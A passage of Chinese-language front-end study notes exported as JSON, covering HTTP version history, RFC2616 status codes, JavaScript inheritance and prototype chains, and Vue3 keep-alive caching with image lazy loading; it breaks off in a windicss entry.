[{"title":"HTTP进化史","url":"/furtherNotes/further/05 HTTP进化史","content":"\n\n# HTTP进化史\n\n\n## HTTP/0.9 - 超文本传输协议\n\n##### 时间：\n\n1991年\n\n##### 需求：\n\n主要用于学术交流，用来在网络之间传递HTML超文本内容，所以被称为超文本传输协议。\n\n##### 实现：\n\n采用基于请求响应的模式，从客户端发出请求，服务器返回数据。\n\n#### 特点：\n\n1. **只有一个请求行** ;\n\n   > request：`GET /index.$html$` —— GET命令 / 资源路径\n\n2. 服务器没有返回头信息，只返回数据；\n\n   > response：`<html>....</html>`\n\n3. 返回的文件内容是以 ASCII 字符流传输的，因为都是 HTML 格式的文件。\n\n## HTTP/1.0 - 被浏览器推动的\n\n##### 时间：\n\n1996年5月\n\n##### 需求：\n\n支持多类型文件的下载是核心诉求，文件格式不仅局限于ASCII编码。\n\n> 展示的类型不只是HTML，还包括 JavaScript、CSS、图片、音频、视频等不同类型文件。\n\n##### 实现：\n\n引入了请求头和响应头，以key-value形式保存。\n\n#### 特点：\n\n+ 为了支持多种类型文件，增加了：\n  1. 浏览器要知道服务器返回的**数据类型**，浏览器才能处理`accept|Content-Type: text/html`\n  2. 为了减轻传输性能，服务器会对数据进行压缩后再传输，所以要知道**压缩方法** `accept-encoding|Content-encoding: gzip,deflate,br`\n  3. 提供国际化支持，需要对不同地区提供不同**语言版本**`accept-Charset: ISO-8859-1,utf-8`\n  4. 不同类型**文件编码**形式不同`accept-language: Zh-Cn,zh`\n+ 其他特性：\n  1. 增加**状态码**告知浏览器服务器最终处理该请求的情况\n  2. 减轻服务器压力，提供**Cache机制**，缓存下载过的数据\n  3. 服务器要统计客户端的基础信息，所以还加入了**用户代理**字段\n  4. 引入了**POST和HEAD**请求方法\n  5. **默认短链接，支持长连接**\n\n>常见的`Content-Type`：`text/plan`、`text/html`、`text/css`、`image/jpeg`、`image/png`、`image/svg + xml`、`application/javascript`、`application/zip`、`application/pdf`\n>\n>Cache：Expires 过期时间、Last-Modified|If-Modified-Since（最后修改时间，s）\n\n#### 缺点：\n\n1. 队头阻塞\n\n   > 队头阻塞  Head-of-Line Blocking，每个TCP连接只能发送一个请求，需要等待前面的请求返回后才能下一次请求。如果 TCP 通道中的某个请求因为某些原因没有及时返回，那么就会阻塞后面的所有请求，这就是著名的队头阻塞的问题。\n\n2. 默认短连接。\n\n3. 仅定义了16种状态码。\n\n## HTTP/1.1 - 缝缝补补\n\n##### 时间：\n\n几个月后\n\n##### 需求：\n\n技术发展，1.0不能满足\n\n#### 更新：\n\n1. **默认使用持久连接 keep-alive **（关闭 Connection:close;），浏览器中对同一个域名，默认允许同时建立6个TCP持久连接。\n\n2. 试图使用**管线化 Pipeline**解决队头阻塞问题\n\n   > HTTP管线化：将多个HTTP请求整批提交给服务器的技术，虽然可以整批发送请求，不过服务器依然需要根据请求顺序来回复浏览器的请求。\n\n3. 提供**虚拟主机**的支持 → 请求头**增加 Host** 字段，表示当前域名地址，这样就可以根据不同Host 值做不同处理\n\n   > 再一个物理主机上绑定多个虚拟主机，每个虚拟主机都油自己单独的域名，这些单独的域名都公用同一个ip地址\n\n4. **chunked机制**，对动态生成的内容提供支持\n\n   > 1.0时要在响应头中设置完整数据大小，`Content-Length:901`，浏览器可以根据设置的数据大小接收数据。但很多页面是动态生成的，在传输数据之前不知道最终的数据大小，浏览器就不知道什么时候接收完所有的文件数据。\n   >\n   > 1.1通过引入 `Chunk transfer` 机制解决这个问题，服务器会将数据分割成多个不同数据块，每个数据块发送时会附上上个数据块的长度，最后使用一个零长度快作为发送数据完成的标志。`Transfer-Encoding: chunked` 替代 `content-length`\n   \n5. **cache机制**，新增cache头部字段\n\n   > Cache-Control：通过指定多个指令实现缓存机制，主要表示资源缓存的最大有效时间。\n   >\n   > + public、private、no-cache、no-store  可缓存 （任何对象、单个用户、不使用强缓存、不使用缓存）\n   > + max-age、s-maxage、max-stale、min-fresh 过期（缓存最大周期、设置共享缓存、愿意接收已过期资源、指定时间内获取最新响应）\n   > + must-revalidate、proxy-revalidate 重新验证/加载 （页面过期服务器获取、同但共享缓存）\n   > + only-if-cached、no-transfrom 其他（只使用缓存、不能转换资源）\n   >\n   > ETag`/`If-None-Match：资源唯一标识\n\n6. **新增请求方法**\n\n   > options、put、delete、trace、connect\n\n7. 新增**状态码**\n\n8. **Cookie、安全机制**\n\n####    缺点：\n\n1. 慢启动和 TCP 连接之间相互竞争带宽 — TCP本身影响\n2. 队头阻塞\n\n> 以下是2.0增加的\n>\n> 1. 无状态特性，巨大HTTP头部\n> 2. 明文传输\n> 3. 不支持服务器推送\n\n## HTTP/2.0 - 提升网络速度\n\n##### 时间：\n\n2015.05\n\n##### 需求：\n\n优化1.1\n\n#### 更新：\n\n1. **一个域名只使用一个TCP长连接**  – 消除队头阻塞\n\n2. 引入**二进制分帧层**，实现**多路复用** – 队头阻塞\n\n   > 可以将请求分成一帧一帧的数据去传输，当收到一个优先级高的请求时，可以暂停之前的请求优先处理关键资源的请求。\n   >\n   > 将一个request/response作为一个stream，并将一个stream根据负载分为多种类型的frame，在同一条connection之上可以混合发送术语不同stream的frame，实现了同时发送多个request的功能\n\n3. **设置请求优先级**\n\n4. **服务器推送**\n\n   > 在浏览器请求HTML时，服务器会把某些资源存在一定关联性JS、CSS等文件等静态资源主动发给客户端，这样客户端可以直接从本地加载这些资源。\n\n5. **头部压缩 HPACK**\n\n#### 缺点：\n\n1. 通过多路复用解决了 HTTP 层的队头阻塞，但仍然**存在 TCP 层的队头阻塞**\n\n   > 如果其中一路数据流出现丢包的情况，就会阻塞该TCP连接中的所有请求。当系统丢包率达到2%时，HTTP/1.1的传输效率必HTTP2.0好。\n\n2. 握手延迟\n\n## HTTP/3.0 - 甩掉TCP、TCL，构建高效网络\n\n##### 时间：\n\n2018.11  HTTP-over-QUIC（Quick UDP Internet Connections）更名为HTTP/3：基于UDP的低时延的互联网传输层协议。\n\n##### 需求：\n\n优化2.0\n\n#### 更新：\n\n1. QUIC协议\n\n   > 基于UDP协议实现了类似于TCP的多路数据流、传输可靠性等功能；\n   >\n   > 继承TLS加密功能；\n   >\n   > 实现HTTP2.0中多路复用功能。\n\n2. 解决TCP层面的队头阻塞\n\n   > TCP队头阻塞，是因为所有请求stream都共享一个滑动窗口，QUIC给每个request流都分配一个独立的滑动窗口。\n   >\n   > 所以其实对于每个请求流而言，也存在队头阻塞。\n\n3. 0-RTT握手\n\n> 参考链接：\n>\n> https://blog.poetries.top/browser-working-principle/guide/part6/lesson29.html\n>\n> https://juejin.cn/post/7111507179881889800","tags":["网络","HTTP"],"categories":["furtherNotes"]},{"title":"HTTP状态码 - RFC2616","url":"/furtherNotes/further/04 http 状态码","content":"\n# http 状态码\n\n## 1. 类别\n\n|      | 类别             | 类别          | 原因短语                   |\n| ---- | ---------------- | ------------- | -------------------------- |\n| 1XX  | 信息性状态码     | Informational | 接收的请求正在处理         |\n| 2XX  | 成功状态码       | Success       | 请求正常处理完毕           |\n| 3XX  | 重定向状态码     | Redirection   | 需要进行附加操作以完成请求 |\n| 4XX  | 客户端错误状态码 | Client Error  | 服务器无法处理请求         |\n| 5XX  | 服务器错误状态码 | Server Error  | 服务器处理请求出错         |\n\n> 以下状态码均记录在RFC2616上，40种。加粗的是常用的14种\n\n## 1XX\n\n100：Continue  继续\n\n101：Switching Protocols  转换协议\n\n## 2XX 成功 — 表明请求被正常处理了\n\n**200：OK**  —— 表示客户端发来的请求在服务器端被正常处理了\n\n201：Created 创建\n\n202：Accepted 接受\n\n203：Non-Authoritative Information 非权威信息\n\n**204：No Content  无内容**  —— 请求处理成功，但没有资源可以返回。页面不刷新。\n\n205：Reset Content 重置内容\n\n**206：Partial Content 局部内容** —— 客户端进行范围请求，响应报文包含 Content-Range 指定范围的实体内容。\n\n## 3XX 重定向 — 表明浏览器需要执行某些特殊的处理以正确处理请求\n\n300：Multiple Choices  多样选择\n\n**301：Moved Permanently 永久移动** —— 永久重定向，请求的资源已被分配新的uri，以后使用资源限制所指的 uri。\n\n**302：Found 创建** —— 临时重定向，请求的资源已被分配了新的uri，希望用户本次使用新的uri访问。\n\n**303：See Other 观察别的部分**  —— 请求对应的资源存在另一个uri，应使用 get 方法定向获取请求的资源。\n\n**304：Not Modified 只读**  —— 客户端发送附带条件的请求时，服务器端允许请求访问资源，但为满足条件的情况。\n\n305：User Proxy 用户代理\n\n**307：Temporary Required 临时重发** —— 临时重定向，与302同，但会遵照浏览器标准，不会从POST变成GET。\n\n## 4XX 客户端错误\n\n**400：Bad Request 坏请求** —— 请求报文种存在语法错误 \n\n**401：Unauthorized 未授权的** —— 发送的请求需要有通过http认证的认证信息。若之前以进行过1次请求，则表示认证失败。\n\n402：Payment Required 必要的支付\n\n**403：Forbidden 禁用** —— 对请求资源的访问被服务器拒绝了。\n\n**404：Not Found 未找到** —— 服务器上无法找到请求的资源。\n\n405：Method Not Allowed 不允许的请求方式\n\n406：Not Acceptable 不接受\n\n407：Proxy Authentication Required 需要代理验证\n\n408：Request Timeout 请求超时\n\n409：Conflict 冲突\n\n410：Gone 停止\n\n411：Length Required 需要的长度\n\n412：Precondition Failed 预处理失败\n\n413：Request Entity Too Large 请求实体太大\n\n414：Request-URI Too Long 请求uri太大\n\n415：Unsupported Media Type 不支持的媒体类型\n\n416：Requested Range Not Satisfiable 请求范围不满足\n\n417：Expectation Failed 期望失败\n\n## 5XX 服务器错误\n\n**500：Internal Server Error 服务器内部错误** —— 服务端在执行请求时发生了错误。\n\n501：Not Implemented 不能实现\n\n502：Bad Gateway 坏网关\n\n**503：Service Unavailable 服务不能实现** —— 服务器暂时处于超负载或正在进行停机维护，无法处理请求。\n\n504：Gateway Timeout 网关超时\n\n505：HTTP Version Not Supported http版本不支持\n\n\n> 参考链接：https://www.rfc-editor.org/rfc/rfc2616","tags":["网络","HTTP"],"categories":["furtherNotes"]},{"title":"保姆级理解js各种继承方案","url":"/furtherNotes/further/04继承","content":"\n# js继承方案\n\n继承本质：复制，重写原型对象，代之以一个新类型的实例\n\n\n\n## 1. 原型链继承\n\n~~~js\nfunction Parent(){\n    this.name = 'parent';\n}\nParent.property.getName = function(){\n    console.log(this.name);\n}\n\nfunction Son(){\n    this.name = 'son';\n    this.property = false;\n}\nSon.prototype = new Parent();\nSon.prototype.getProperty = function(){\n    console.log(this.property)\n}\n\nlet son = new Son();\nson.getName();    // son\nson.getProperty(); // false\n\n// Son.prototype\nParent: {\n    getPrototype: f(),\n    name: 'parent',\n    __proto__: {\n        getName: f(),\n        constructor: f Parent(),\n        __proto__: Object\n    }\n}\n\n// son\nSon: {\n    name: 'son',\n    prototype: false,\n    __proto__: Parent {       // 原型对象指向 Parent\n        getPrototype: f(),\n        name: 'parent',\n        __proto__: Object\n    }\n}\n\n// 原Son.prototype\nconstructor: f {\n    constructor: f(),\n    __proto__: Object\n}\n~~~\n\n核心代码：` Son.prototype = new Parent()`\n\n优点：\n\n1. 继承了父类原型上的属性和方法\n\n缺点：\n\n1. 多个`Son`实例对`new Parent()`后拥有的属性进行操作时，都是操作同一个属性；\n2. `Son`的原型上的 `constructor` 属性没了；\n3. 给`Son`的原型增加属性和方法必须在替换原型后，否则会被覆盖；\n4. 创建`Son`实例时无法向`Parent`的构造函数传参\n\n## 2. 构造函数继承\n\n~~~js\nfunction Parent(){\n    this.color = ['red','pink'];\n}\nParent.prototype.getColor = function(){\n    console.log(this.color.toString())\n}\nfunction Son(){\n    Parent.call(this);\n    this.name = 'son';\n}\n\nlet son1 = new Son();\nson1.color.push('blue') // this.color = ['red', 'pink', 'blue']\nson1.getColor();  // getColor is not defined!\n\nlet son2 = new Son();\nson2.color // ['red', 'pink']\n\n// Son.prototype\nconstructor:f {     // 原型链继承是 Parent\n    constructor: f Son(),\n    __proto__: {\n        constructor: f Object(), // 原型链继承是 Parent \n    }\n}\n\n// son1\nSon{\n    color: ['red', 'pink', 'blue'],\n    name: 'son',\n    __proto__: {  // 原型链继承是 Parent{}\n        constructor: f Son(),  \n        __proto__: Object\n    }\n}\n~~~\n\n核心代码： `Parent.call(this)`  \n\n在实例化每一个`Son`时，执行 `Parent` 的构造函数\n\n优点：\n\n1. 对于每一个`Son`的实例，都能独有一份父类的属性和方法\n2. 能给父类传参\n3. `Son` 原型上有其原本的 `constructor` \n\n缺点：\n\n1.  只能继承父类构造函数里的属性方法，不能继承父类原型上的属性方法\n2. 每个子类在最初都有一样的完整的父类实例副本，无法复用\n\n## 3. 组合继承\n\n~~~js\nfunction Parent(name){\n    this.name = name;\n    this.color = ['red','pink'];\n}\nParent.prototype.getName = function(){\n    console.log(this.name);\n}\n\nfunction Son(name, age){\n    Parent.call(this, name);\n    this.age = age;\n}\nSon.prototype = new Parent();\nSon.constructor = Son;  \nParent.prototype.getAge = function(){\n    console.log(this.age);\n}\n\nlet son = new Son('son', 12);\nson.color.push('blue')  // ['red','pink','blue']\nson.getName(); //son\nson.getAge();  // 12\n\nlet son1 = new Son('son1', 15);\nson.color  // ['red','pink']\n\n// Son.prototype\nParent{\n    color: ['red', 'pink'],\n    name: undefined,\n    __proto__:{\n        getAge: f (),\n        getName: f (),\n        constructor: f Parent(name),\n        __proto__: Object\n    }\n}\n\n// son\nSon{\n    age: 12,\n    color: ['red', 'pink', 'blue'],\n    name: 'son',\n    __proto__: Parent{\n        color: ['red', 'pink'],\n        name: undefined,\n        __proto__: Object\n    }\n}\n~~~\n\n核心代码：\n\n1. `Parent.call(this)` 为每一个子类实例，获得独一份父类的属性方法 — **构造函数继承**\n2. `Son.prototype = new Parent()`  讲父类的原型 传递给子类的原型对象`__proto__`  — **原型链继承**\n3. `Son.constructor = Son` 弥补覆盖原型后 Son 的constructor不存在\n\n优点：\n\n1. 继承了父类的原型\n2. 每个子类实例拥有独一份的父类属性方法\n3. 子类的`constructor`属性存在\n4. 利用原型链取值原则，屏蔽了与子元素同名的属性的获取\n\n缺点：\n\n1. 在 `Son.prototype = new Parent()`时，会执行一次父类构造函数，给子类原型增加父类的属性方法；\n\n   在 实例化子类时， 会调用`Parent.call(this)`， 再执行一次父类构造函数，给子类增加父类的属性方法；\n\n   > 在不用的地方有完全一模一样的属性方法被两次写入，冗余\n\n\n\n## 4. 原型式继承\n\n~~~js\nfunction object(obj){ // obj 父类 返回obj的原型对象\n    function F(){};\n    F.prototype = obj;  \n    return new F();\n}\nfunction Parent(){\n    this.name = 'parent';\n}\nlet person = {\n    name: 'dddd'\n}\n\n// 分布解读\n// 1. function F(){};\n// F.prototype \n{\n    constructor: f F(),\n    __proto__: Object\n}\n\n// 2. F.prototype = Parent;    // 浅复制 Parent\n// F.prototype\nParent(){\n    this.name = 'parent'\n}\n// F.prototype = person F.prototye\n{\n    name: 'dddd,\n    __proto__: Object\n}\n\n\n// 3. new F();  返回值 原型对象 指向传入对象 的实例\n// Parent\nF{\n    __proto__: f Parent(){\n        arguments, caller, length, name:\"Parent\",\n        prototype:{...},\n        __proto__: f ()\n    }\n}\n// person\nF{\n    __proto__: {\n        name: 'dddd',\n        __proto__: Object\n    }\n}\n~~~\n\n~~~js\nlet person = {\n    name : 'dddd';\n    color : ['red','pink'];\n}\n\nlet man = object(person);\nman.name = 'man';\nman.color.push('blue')\n\nlet man1 = object(person);\n\n// man\nF{\n    name: 'man',\n    __proto__: {\n        color: ['red', 'pink', 'blue'],\n        name: 'dddd',\n        __proto__: Object\n    }\n}\n\n// man1\nF{\n    __proto__: {\n        color: ['red', 'pink', 'blue'],\n        name: 'dddd',\n        __proto__: Object\n    }\n}\n~~~\n\n核心代码：`function object(obj){ function F(); F.prototype = obj; return new F();}`\n\n优点：\n\n1. 继承了父类的原型\n\n缺点：\n\n1. `obj`是函数时，子类无法得到父类构造函数的属性和方法\n2. `F.prototype = obj ` 是浅复制，所以所有子类操作的是父类同一个引用类型数据\n3. 无法传递参数\n4. `object()` 可以用 `es5` 的 `Object.create()` 替代\n\n## 5. 寄生式继承\n\n~~~js\nfunction create(ori){\n    let clone = object(ori);\n    // 可在此增强对象\n    clone.getName = function(){\n        return this.name;\n    }\n    return clone; \n}\n\nlet person = {\n    name: 'dddd',\n    color: ['red']\n}\nperson.prototype.getColor = function(){\n    return this.color;\n}\n\nlet son = create(person);\nson.name = 'son';\nson.color.push('pink')\n\nlet son1 = create(person);\n\n// son\nF {\n    getName: f(),\n    name: 'son'\n    __proto__: {\n        color : ['red','pink'],\n        name: 'dddd',\n        __proto__: Object\n    }\n}\n\n// son1\nF {\n    getName: f(),\n    __proto__: {\n        color : ['red','pink'],\n        name: 'dddd',\n        __proto__: Object\n    }\n}\n\n\n~~~\n\n核心代码：`function create(ori){ let clone = object(ori); clone.getName = function(){}; return clone; }`\n\n跟原型继承的区别：\n\n1. 能增强对象，为构造函数新增属性方法，增强函数\n\n优点：\n\n1. 继承了父类的原型\n\n缺点：\n\n1. `obj`是函数时，子类无法得到父类构造函数的属性和方法\n2. `F.prototype = obj ` 是浅复制，所以所有子类操作的是父类同一个引用类型数据\n3. 无法传递参数\n4. `object()` 可以用 `es5` 的 `Object.create()` 替代\n\n## 6. 寄生组合式继承\n\n~~~js\nfunction inherit(son, parent){\n    let prototype = Object.create(parent.prototype);\n    prototype.constructor = son;\n    son.prototype = prototype;\n}\n\nfunction Parent(name){\n    this.name = name;\n    this.color = ['red']\n    this.getName = function(){\n        console.log(this.name)\n    }\n}\nParent.prototype.getColor = function(){\n    console.log(this.color);\n}\n\nfunction Son(name, age){\n    Parent.call(this, name);\n    this.age = age;\n}\n\ninherit(son, parent);    // 将son的原型对象指向 parent的原型\n\nSon.prototype.getAge = function(){\n    console.log(this.age);\n}\n\nlet son = new Son('son', 12);\nson.name = 'sonson0';\nson.color.push('pink');\n\nlet son1 = new Son('son1', 20);\n\n// son\nSon = {\n    name: 'sonson0',                  // 继承父类实例\n    color: ['red', 'pink'],           // 继承父类实例\n    getName: f (),                    // 继承父类实例\n    age: 12,                          // 子类实例\n    __proto__: Parent {\n    \tconstructor: Son (name, age), \n        getAge: f (),\t\t\t\t  // 继承子类原型\n        __proto__: Object {\n            constructor: Parent(),   \n            getColor: f(),            // 继承父类原型\n            __proto__: Object\n        }\n\t}\n}\n\n// son1\nSon = {\n    name: undefined,\n    color: ['red'],\n    getName: f (),\n    age: 20,\n    __proto__: Parent {\n    \tconstructor: Son (name, age),\n        getAge: f (),\n        __proto__: Object {\n            constructor: Parent(),\n            getColor: f(),\n            __proto__: Object\n        }\n\t}\n}\n\n~~~\n\n核心代码：\n\n   \t`son.prototype = Object.create(parent.prototype); son.prototye.constructor = son `    — **寄生模式**\n\n​       `Parent.call(this)` — **构造函数传参**\n\n与组合继承的区别在于：\n\n1. 组合继承使用 `son.prototype = new Parent()` ； 而寄生组合使用 `son.prototype = Object.create(Parent.prototype)`\n2. 组合会执行两次`Parent.call(this)` ；寄生组合只会在实例化 `Son` 时，执行一次 `Parent.call(this)`\n\n优点：\n\n1. 最成熟的继承实现方法，也是库实现的方法\n\n## 7. 混入方式继承\n\n~~~js\nfunction Son(){\n    Parent.call(this);\n    Parent2.call(this);\n}\n\nSon.prototype = Object.create(Parent.prototype);\nObject.assign(Son.prototype, Parent2.prototype); // 将Parent2.prototype 拷贝到 Son.prototype\n\nSon.prototype.constructor = Son;\n~~~\n\n\n\n## 8. es6类继承 extends\n\n~~~js\nclass Parent{\n    constructor(name){\n        this.name = name;\n    }\n    \n    getName = function(){\n        return this.name;\n    }\n    \n    setName = function(name){\n        this.name = name;\n    }\n}\n\nclass Son extends Parent{\n    constructor(name, age){\n        super(name);\n        this.age = age;\n    }\n    \n    getAge = function(){\n        return age;\n    }\n\n\tsetAge = function(age){\n        this.age = age;\n    }\n}\n\nlet son = new Son('son', 12)\n\n\n// son\nSon = {\n    age: 12,\n    name: 'son',\n    getAge: f(), setAge: f(),\n    getName: f(), setName: f(),\n    __proto__: Parent{\n    \tconstructor: class Son,\n    \t__proto__: {\n    \t\tconstructor: class Parent,\n    \t\t__proto__: Object\n\t\t}\n\t}\n}\n~~~\n\n\n\nextends 关键字的核心代码实现\n\n~~~js\nfunction _inherits(subType, superType) {\n  \n    // 创建对象，创建父类原型的一个副本\n    // 增强对象，弥补因重写原型而失去的默认的constructor 属性\n    // 指定对象，将新创建的对象赋值给子类的原型\n    subType.prototype = Object.create(superType && superType.prototype, {\n        constructor: {\n            value: subType,\n            enumerable: false,\n            writable: true,\n            configurable: true\n        }\n    });\n    \n    if (superType) {\n        Object.setPrototypeOf \n            ? Object.setPrototypeOf(subType, superType) \n            : subType.__proto__ = superType;\n    }\n}\n~~~\n\n\n> 参考文章：https://juejin.cn/post/6844903696111763470\n>\n> https://muyiy.cn/blog/5/5.2.html","tags":["js"],"categories":["furtherNotes"]},{"title":"深入js原型 prototype、原型对象 __proto__ [[prototype]]、原型链","url":"/furtherNotes/further/03原型","content":"\n原型： `Prototype`\n\n原型对象：`__proto__ `  `[[prototype]]`\n\n原型链：每个对象有一个原型对象，通过 `__proto__` 指针 指向上一个原型，并继承其方法和属性，同时原型对象也可能拥有原型，\t\t\t\t\t\t这样一层一层，最终指向 `null`。 \n\n通过原型链一个对象会拥有定义在其他对象中的属性和方法。\n\n~~~js\nfunction Parent(){\n    this.name = 'function parent name'\n}\nlet p = new Parent();\nlet c = Object.create(p);  // child 是一个新的空对象，有一个指向对象 p 的指针 __proto__\n\nParent // function Parent(){ this.name = '...' }\nParent.constructor   // Function() { [native code] } 默认值 与其他任何引用or基本类型同\nParent.prototype  // Object类型 { constructor:f Parent() , __proto__:Object }\nParent.prototype.constructor === Parent  // function Parent(){ this.name = '...' }\n\nParent.__proto__ === Function.prototype // f() { [native code] }  \nObject.getPrototypeOf(Parent) // f() { [native code] } 通常用这个 function get __proto__ === [[prototype]]\nParent.__proto__.constructor === Parent.constructor  // Function(){ [native code] } \nParent.__proto__ != Parent.__proto__.constructor\n\n// -------------------------------------------------------------------------\n\np // Parent {name: \"...\", __proto__: {} }\np.constructor // f Parent() { this.name = '...' }  找的是 __proto__ 的\np.__proto__.contructor === Parent === p.constructor // f Parent() { this.name = '...' }\np.__proto__ === Parent.prototype\n\n\n// -------------------------------------------------------------------------\n\nc // Parent{ __proto__: Parent{ name:'...', __proto__: {} } }\n// c == Parent {__proto__: p}\nc.constructor // f Parent() { this.name = '...' }\nc != p != Parent\nc.__proto__ === p\nc.__proto__.__proto__ === p.__proto__\n\n\n\nParent.__proto__ === Function.prototype \nFunction.prototype.__proto__ === Object.prototype\n\np.__proto__ === Parent.prototype\nParent.prototype.__proto__ === Object.prototype\nObject.prototype.__proto__ === null\n~~~\n\n\n\n~~~js\nParent.prototype = {\n    constructor: Parent(){\n    \targuments, caller, length, name: \"Parent\",\n    \tprototype : {...}, // 这里一整个 循环引用类似\n\t\t__proto__ : f(){...}, // 一些api apply, constructor, toString, symbol...\n        [[FunctionLocation]]: ...,\n        [[Scopes]] : Scopes[ Global: {} ]\n\t},\n        \n    __proto__: {\n        constructor: f Object(){ // Object 构造函数\n            arguments:{}, assign(), caller:{}, create(), defineProperties(), defineProperty(), entries(), freeze(), formEntries(), getOwnPropertyDescriptor()...\n        },\n        hasOwnProperty(), \n        isPrototypeOf(), \n        propertyIsEnumerable(),\n        toLocaleString(),\n        toString(), valueOf()...\n    }\n}\n~~~\n\n\n\n+ Symbol 作为构造函数来说不完整，因为不支持 `new Symbol()`，但其原型上有 `constructor` 属性 `===  Symbol.prototype.constructor`\n\n+ 引用类型 `constructor` 属性是可以修改的，但对于基本类型是只读的，`null undefined` 没有 `constructor` \n\n+ `__proto__`  是每个实例都有的属性，`prototype` 是构造函数的属性，在实例上不存在，但是`p.__proto__`  `Parent.prototype` 指向同一个对象\n\n+ `__proto__` 在 `es6` 被标准化，但性能问题并不推荐使用，推荐使用 `Object.getPrototypeOf()`\n\n  \n\n+ instanceof 原理：一层层查找 `__proto__`，如果和 `constructor.prototype` 相等则返回 `true` ","tags":["js"],"categories":["furtherNotes"]},{"title":"项目性能优化之缓存和懒加载","url":"/workNotes/work/12 页面跳转缓存和图片懒预加载","content":"\n1. 在页面跳转的情况下，还是会有资源重新加载的情况，所以使用了 keep-alive\n\n   1. 在 router.js 增加允许使用 keep-alive\n\n      ```js\n      import * as VueRouter from \"vue-router\";\n      import Home from \"./components/Home.vue\";\n      import List from \"./components/List.vue\";\n      const router = VueRouter.createRouter({\n        history: VueRouter.createWebHashHistory(),\n        routes: [\n          {\n            path: \"/\",\n            component: Home,\n            meta: {\n              name: \"home\",\n              requiresAuth: true, //\n              keepAlive: true, // 允许使用缓存\n            },\n          },\n          {\n            path: \"/list/:category\",\n            component: List,\n            meta: {\n              name: \"list\",\n              requiresAuth: true,\n              keepAlive: true,\n            },\n          },\n        ],\n      });\n\n      export default router;\n      ```\n\n   2. 在 app.js 使用 keep-alive\n\n      ```html\n      <template>\n        <!-- vue3 写法 -->\n        <router-view v-slot=\"{ Component }\">\n          <keep-alive v-if=\"$route.meta.keepAlive\">\n            <component :is=\"Component\" />\n          </keep-alive>\n          <component v-if=\"!$route.meta.keepAlive\" :is=\"Component\" />\n        </router-view>\n        <!-- vue2 写法 -->\n        <keep-alive>\n          <router-view v-if=\"$route.meta.keepAlive\"></router-view>\n        </keep-alive>\n        <router-view v-if=\"!$route.meta.keepAlive\"></router-view>\n      </template>\n      ```\n\n> <font color=\"red\">如果第一个方法没有效果的话，那么要结合第二个看</font>\n\n2. 路由回退中 router.go() 与 router.back()\n\n   > https://blog.csdn.net/qq_42618566/article/details/91045282\n\n   - `go()` 原页面表单中的内容会丢失\n   - `back()` 原页面表单中的内容会保留\n     - `back()` 后退\n     - `back(0)` 刷新\n     - `back(1)` 前进\n\n3. 使用 keep-alive，第二次跳转页面后 不会 触发到原先在 onMounted 的 使页面到顶部，就会保持上个页面滚动条的滚动情况\n\n   - 在 onActived 写一个与 onMounted 一样的逻辑\n   - 页面第一次进入的时候，钩子触发的顺序是 created->mounted->activated，所以别在 mounted 和 activated 方法中写相同的逻辑代码\n\n   ```js\n   onActivated(() => {\n     if (document.documentElement.scrollTop) {\n       document.documentElement.scrollTop = 0;\n     } else if (window.pageYOffset) {\n       window.pageYOffset = 0;\n     } else if (document.body.scrollTop) {\n       document.body.scrollTop = 0;\n     }\n   });\n   ```\n\n4. 图片懒加载\n\n   - 原理：将图片的 url 放在 `<img src=\"\" :data-src=\"url\" />` 的 data-src 里，当图片位于用户可视区时就将 url 放到 src 属性里\n   - 判断图片是否位于可视区的方法:\n\n     1. scroll 事件监听，用 scrollTop 等属性计算位置判断\n     2. 使用 Intersection Observer\n     3. Intersection Observer\n        > https://juejin.cn/post/7080544007834730510 这篇文章挺全面的\n\n   - 解决方法\n     > 因为 项目是 vue3 + vant，所以使用 vant 自带的 `<van-image lazy-load></van-image>`\n\n5. 图片懒加载的前提下，在右滑 or 轮播图切换，及非垂直滚动时做图片预加载，增加用户体验\n\n   - 原理均类似于懒加载的原理，因为图片地址在 src 属性里时，页面就会自动加载图片资源了\n\n   - **轮播**原理：在当前图片轮播时，就将下一张图片给加载出来，这部分是取消了懒加载啦\n   - 实现:\n\n   ```html\n   <img class=\"w-100vw h-full relative\" :src=\"realPic[index]\" />\n   ```\n\n   ```js\n   /**\n    * 轮播图 图片懒加载\n    *\n    * imgs: 配置文件中的 banner 图片的链接\n    * realPic: 真正页面使用的图片的链接\n    * changePic: 轮播图 图片切换的时候触发函数，预先加载后一个图片\n    */\n   let imgs = [];\n   for (let item of board_1) {\n     imgs.push(item.banner);\n   }\n   let realPic = reactive([imgs[0], imgs[1]]);\n   let count = ref(2);\n\n   const changePic = limit(() => {\n     let img = new Image();\n     img.src = imgs[count.value];\n     if (img.complete) {\n       return;\n     }\n     if (count.value < imgs.length) {\n       realPic.push(imgs[count.value]);\n       count.value++;\n     }\n     // console.log(realPic);\n   }, imgs.length - count.value);\n   ```\n\n   - **右滑**原理：所以在需要预加载的图片的 src 为 一个图片数组，初始情况下，数组为空，在懒加载的图片加载完成后就把该数组用 图片 src 填满\n   - 实现\n\n     ```html\n     <template v-if=\"index < 4\">\n       <van-image\n         :src=\"item.banner\"\n         class=\"w-full h-full\"\n         lazy-load\n         @load=\"load(index)\"\n       ></van-image>\n     </template>\n     <template v-else>\n       <van-image :src=\"preimg[index]\" class=\"w-full h-full\"></van-image>\n     </template>\n     ```\n\n     ```js\n     let preimg = reactive([]);\n\n     const load = limit(() => {\n       for (let i = 0; i < board_2.list.length; i++) {\n         preimg.push(board_2.list[i].banner);\n       }\n     }, 1);\n     ```\n\n6. 计算首屏时间\n\n   > https://blog.csdn.net/weixin_40599109/article/details/108622434\n\n   ```js\n   var t = performance.timing;\n   var pageLoadTime = t.loadEventEnd - t.navigationStart;\n   // 在这里pageLoadTime就是首屏时间\n   ```\n\n7. 在进入同一个有 keepalive 的组件，但是要展示不同数据时，就要合理修改 reactive 的值\n","tags":["vite","vue3"],"categories":["workNotes"]},{"title":"记录 windicss 使用过程中遇到的属性","url":"/workNotes/work/11 vite vue3 windicss backgroundImage","content":"\n1. 常规使用\n\n   **文字 背景**\n\n   - font-size --- text-[12px]\n   - font-weight --- font-[500]\n   - line-height --- leading-[14px]\n   - color --- text-[#5E6673]\n   - background --- bg-[#1A2437]\n   - opacity --- opacity-60\n   - 文本溢出 --- line-clamp-3\n\n   **盒子模型**\n\n   - padding --- px(横向) py(纵向) pt pb pl pr\n   - margin\n   - width --- w\n   - height --- h\n   - 圆角边框 --- rounded-[4px]\n\n   **定位**\n\n   - position --- relative/absolute\n   - display --- block/flex\n   - flex --- flex-col/justify-between/flex-grow-0/items-center\n   - z-index --- z-index-1\n\n- first-of-type:mt-0\n\n2. 使用 backgroundImage 做渐变失效的解决方案\n\n   1. 在 `windi.config.js` 文件中添加\n\n   ```js\n     